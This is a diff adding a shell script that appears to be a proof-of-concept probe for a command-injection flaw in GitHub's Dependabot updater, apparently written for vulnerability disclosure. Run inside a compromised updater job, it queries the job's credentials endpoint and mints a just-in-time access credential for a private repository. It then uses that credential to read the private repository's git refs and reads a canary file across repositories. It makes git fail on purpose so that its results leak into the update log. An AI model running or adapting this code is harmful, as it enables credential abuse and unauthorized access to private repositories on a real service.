@@ -1,0 +1,222 @@
+#!/bin/sh
+# Hosted-impact probe for the Dependabot updater command-injection lab.
+# It emits status and non-secret metadata only; response bodies are never logged.
+set +e
+
+api_base="${DBOT_API_BASE:-https://api.github.com}"
+tmp_prefix="/tmp/dbot-boundary-$$"
+
+probe_repo_file() {
+  label="$1"
+  url="$2"
+  output="${tmp_prefix}-${label}.json"
+  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
+  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
+  blob_sha="$(ruby -rjson -e 'j=JSON.parse(File.read(ARGV[0])); print(j["sha"].to_s)' "$output" 2>/dev/null)"
+  printf 'DBOT_%s_STATUS=%s SIZE=%s BLOB_SHA=%s\n' "$label" "${code:-curl_error}" "${size:-0}" "${blob_sha:-none}" >&2
+  rm -f "$output"
+}
+
+probe_installation_scope() {
+  output="${tmp_prefix}-installation.json"
+  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$api_base/installation/repositories?per_page=1" 2>/dev/null)"
+  total_count="$(ruby -rjson -e 'j=JSON.parse(File.read(ARGV[0])); print(j["total_count"].to_s)' "$output" 2>/dev/null)"
+  printf 'DBOT_INSTALLATION_STATUS=%s TOTAL_COUNT=%s\n' "${code:-curl_error}" "${total_count:-none}" >&2
+  rm -f "$output"
+}
+
+probe_job_credentials() {
+  output="${tmp_prefix}-credentials.json"
+  if [ -z "${DEPENDABOT_API_URL:-}" ] || [ -z "${DEPENDABOT_JOB_ID:-}" ]; then
+    printf 'DBOT_CREDENTIALS_STATUS=not_configured CREDENTIAL_COUNT=0 SECRET_FIELDS_PRESENT=0 CANARY_MATCH=0\n' >&2
+    return
+  fi
+
+  endpoint="${DEPENDABOT_API_URL%/}/update_jobs/${DEPENDABOT_JOB_ID}/credentials"
+  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$endpoint" 2>/dev/null)"
+  summary="$(ruby -rjson -rdigest -e '
+    begin
+      parsed = JSON.parse(File.read(ARGV[0]))
+      credentials = parsed.dig("data", "attributes", "credentials") || parsed["credentials"] || []
+      secret_keys = %w[token password auth-key key]
+      values = credentials.flat_map { |credential| secret_keys.filter_map { |key| credential[key] } }
+      print "#{credentials.length} #{values.count { |value| !value.to_s.empty? }}"
+    rescue StandardError
+      print "0 0"
+    end
+  ' "$output" 2>/dev/null)"
+  set -- ${summary:-0 0}
+  printf 'DBOT_CREDENTIALS_STATUS=%s CREDENTIAL_COUNT=%s SECRET_FIELDS_PRESENT=%s\n' \
+    "${code:-curl_error}" "${1:-0}" "${2:-0}" >&2
+  rm -f "$output"
+}
+
+probe_job_policy() {
+  if [ -z "${DEPENDABOT_JOB_PATH:-}" ] || [ ! -r "$DEPENDABOT_JOB_PATH" ]; then
+    printf 'DBOT_JOB_POLICY_STATUS=not_configured REJECT_EXTERNAL_CODE=unknown EGRESS_OBSERVE=unknown EGRESS_ENFORCE=unknown REPO_PRIVATE=unknown JIT_METADATA_COUNT=0\n' >&2
+    return
+  fi
+
+  summary="$(ruby -rjson -e '
+    begin
+      parsed = JSON.parse(File.read(ARGV[0]))
+      job = parsed["job"] || parsed.dig("data", "attributes") || {}
+      experiments = job["experiments"] || {}
+      metadata = job["credentials-metadata"] || job["credentials_metadata"] || []
+      bool = ->(value) { value == true ? 1 : 0 }
+      jit_count = metadata.count { |credential| credential["type"] == "jit_access" }
+      print "ok #{bool.call(job["reject-external-code"])} #{bool.call(experiments["proxy-egress-observe"])} #{bool.call(experiments["proxy-egress-enforce"])} #{bool.call(job["repo-private"])} #{jit_count}"
+    rescue StandardError
+      print "parse_error unknown unknown unknown unknown 0"
+    end
+  ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
+  set -- ${summary:-parse_error unknown unknown unknown unknown 0}
+  printf 'DBOT_JOB_POLICY_STATUS=%s REJECT_EXTERNAL_CODE=%s EGRESS_OBSERVE=%s EGRESS_ENFORCE=%s REPO_PRIVATE=%s JIT_METADATA_COUNT=%s\n' \
+    "${1:-parse_error}" "${2:-unknown}" "${3:-unknown}" "${4:-unknown}" "${5:-unknown}" "${6:-0}" >&2
+}
+
+probe_jit_access() {
+  output="${tmp_prefix}-jit.json"
+  if [ -z "${DEPENDABOT_API_URL:-}" ] || [ -z "${DEPENDABOT_JOB_ID:-}" ]; then
+    printf 'DBOT_JIT_STATUS=not_configured USERNAME_PRESENT=0 SECRET_FIELDS_PRESENT=0 SCOPE_MATCH=0\n' >&2
+    printf 'DBOT_JIT_DIRECT_GIT_STATUS=not_configured SIZE=0\n' >&2
+    return
+  fi
+
+  jit_path="/update_jobs/${DEPENDABOT_JOB_ID}/create_jit_access"
+  if [ -n "${DEPENDABOT_JOB_PATH:-}" ] && [ -r "$DEPENDABOT_JOB_PATH" ]; then
+    configured_path="$(ruby -rjson -e '
+      begin
+        parsed = JSON.parse(File.read(ARGV[0]))
+        job = parsed["job"] || parsed.dig("data", "attributes") || {}
+        credentials = job["credentials-metadata"] || job["credentials_metadata"] || []
+        entry = credentials.find { |credential| credential["type"] == "jit_access" }
+        print entry["endpoint"].to_s if entry
+      rescue StandardError
+      end
+    ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
+    if [ -n "$configured_path" ]; then
+      jit_path="$configured_path"
+    fi
+  fi
+
+  case "$jit_path" in
+    http://*|https://*) endpoint="$jit_path" ;;
+    *) endpoint="${DEPENDABOT_API_URL%/}${jit_path}" ;;
+  esac
+  jit_endpoint="$endpoint"
+
+  code="$(curl -ksS --max-time 8 -X POST -H 'Content-Type: application/json' \
+    -H 'User-Agent: dependabot-proxy/1.0' \
+    --data '{"account":"FazeMike1","repository":"priv-a"}' \
+    -o "$output" -w '%{http_code}' "$endpoint" 2>/dev/null)"
+  summary="$(ruby -rjson -e '
+    begin
+      credential = JSON.parse(File.read(ARGV[0]))
+      values = %w[token password auth-key key].filter_map { |key| credential[key] }
+      scopes = credential["accessible-repos"] || credential["accessible_repos"] || []
+      print "#{credential["username"].to_s.empty? ? 0 : 1} #{values.count { |value| !value.to_s.empty? }} #{scopes.include?("FazeMike1/priv-a") ? 1 : 0}"
+    rescue StandardError
+      print "0 0 0"
+    end
+  ' "$output" 2>/dev/null)"
+  set -- ${summary:-0 0 0}
+  printf 'DBOT_JIT_STATUS=%s USERNAME_PRESENT=%s SECRET_FIELDS_PRESENT=%s SCOPE_MATCH=%s\n' \
+    "${code:-curl_error}" "${1:-0}" "${2:-0}" "${3:-0}" >&2
+
+  # Prove that the returned credential itself can read the private repository,
+  # without printing or persisting it. An explicit Basic header makes the proxy
+  # preserve this JIT credential instead of substituting its fallback token.
+  if [ "${DBOT_SKIP_JIT_DIRECT_PROBE:-0}" = "1" ]; then
+    printf 'DBOT_JIT_DIRECT_GIT_STATUS=skipped SIZE=0\n' >&2
+  elif [ "$code" = "200" ]; then
+    jit_username="$(ruby -rjson -e 'begin; print JSON.parse(File.read(ARGV[0]))["username"].to_s; rescue StandardError; end' "$output" 2>/dev/null)"
+    jit_password="$(ruby -rjson -e '
+      begin
+        credential = JSON.parse(File.read(ARGV[0]))
+        print(%w[password token auth-key key].filter_map { |key| credential[key] }.find { |value| !value.to_s.empty? }.to_s)
+      rescue StandardError
+      end
+    ' "$output" 2>/dev/null)"
+    if [ -n "$jit_username" ] && [ -n "$jit_password" ]; then
+      jit_auth="$(printf '%s:%s' "$jit_username" "$jit_password" | base64 | tr -d '\r\n')"
+      jit_curl_config="${tmp_prefix}-jit-curl.conf"
+      jit_git_output="${tmp_prefix}-jit-direct-git.bin"
+      umask 077
+      printf 'header = "Authorization: Basic %s"\n' "$jit_auth" > "$jit_curl_config"
+      jit_git_url="${DBOT_JIT_GIT_URL:-https://github.com/FazeMike1/priv-a.git/info/refs?service=git-upload-pack}"
+      direct_code="$(curl -ksS --max-time 8 --config "$jit_curl_config" \
+        -o "$jit_git_output" -w '%{http_code}' \
+        "$jit_git_url" 2>/dev/null)"
+      direct_size="$(wc -c < "$jit_git_output" 2>/dev/null | tr -d ' ')"
+      rm -f "$jit_curl_config" "$jit_git_output"
+      unset jit_auth jit_username jit_password jit_git_url
+      printf 'DBOT_JIT_DIRECT_GIT_STATUS=%s SIZE=%s\n' "${direct_code:-curl_error}" "${direct_size:-0}" >&2
+    else
+      printf 'DBOT_JIT_DIRECT_GIT_STATUS=no_credential SIZE=0\n' >&2
+    fi
+  else
+    printf 'DBOT_JIT_DIRECT_GIT_STATUS=not_attempted SIZE=0\n' >&2
+  fi
+  rm -f "$output"
+}
+
+probe_jit_denied_control() {
+  output="${tmp_prefix}-jit-denied-control.json"
+  if [ -z "${jit_endpoint:-}" ]; then
+    printf 'DBOT_JIT_DENIED_CONTROL_STATUS=not_configured SECRET_FIELDS_PRESENT=0\n' >&2
+    return
+  fi
+
+  code="$(curl -ksS --max-time 8 -X POST -H 'Content-Type: application/json' \
+    -H 'User-Agent: dependabot-proxy/1.0' \
+    --data '{"account":"FazeMike1","repository":"dbot-nonexistent-jit-control-20261017"}' \
+    -o "$output" -w '%{http_code}' "$jit_endpoint" 2>/dev/null)"
+  secret_count="$(ruby -rjson -e '
+    begin
+      credential = JSON.parse(File.read(ARGV[0]))
+      print(%w[token password auth-key key].count { |key| !credential[key].to_s.empty? })
+    rescue StandardError
+      print 0
+    end
+  ' "$output" 2>/dev/null)"
+  printf 'DBOT_JIT_DENIED_CONTROL_STATUS=%s SECRET_FIELDS_PRESENT=%s\n' \
+    "${code:-curl_error}" "${secret_count:-0}" >&2
+  rm -f "$output"
+}
+
+probe_jit_git_access() {
+  if [ "${DBOT_SKIP_GIT_PROBE:-0}" = "1" ]; then
+    printf 'DBOT_JIT_GIT_STATUS=skipped REF_COUNT=0 HEAD_SHA=none\n' >&2
+    return
+  fi
+
+  output="${tmp_prefix}-jit-git.txt"
+  GIT_TERMINAL_PROMPT=0 git ls-remote \
+    https://github.com/FazeMike1/priv-a.git HEAD refs/heads/main >"$output" 2>/dev/null
+  status=$?
+  ref_count="$(wc -l < "$output" 2>/dev/null | tr -d ' ')"
+  head_sha="$(awk '$2 == "HEAD" { print $1; exit }' "$output" 2>/dev/null)"
+  printf 'DBOT_JIT_GIT_STATUS=%s REF_COUNT=%s HEAD_SHA=%s\n' \
+    "$status" "${ref_count:-0}" "${head_sha:-none}" >&2
+  rm -f "$output"
+}
+
+probe_repo_file CONTROL "$api_base/repos/FazeMike1/dbot-poc/contents/.gitmodules"
+probe_repo_file XREPO "$api_base/repos/FazeMike1/priv-a/contents/secret-canary.txt"
+probe_installation_scope
+probe_job_policy
+probe_job_credentials
+probe_jit_access
+probe_jit_denied_control
+probe_jit_git_access
+
+job_token_len="${#DEPENDABOT_JOB_TOKEN}"
+printf 'DBOT_UPDATER_JOB_TOKEN_LEN=%s API_BASE_SCHEME=%s\n' "$job_token_len" "${api_base%%:*}" >&2
+
+# Dependabot normally surfaces command output only when the enclosing Git command
+# fails. Unstage only the transient workspace directory so `git commit` fails
+# deterministically and includes the non-secret markers above in the update log.
+git reset -q HEAD -- . 2>/dev/null
+
+exit 1
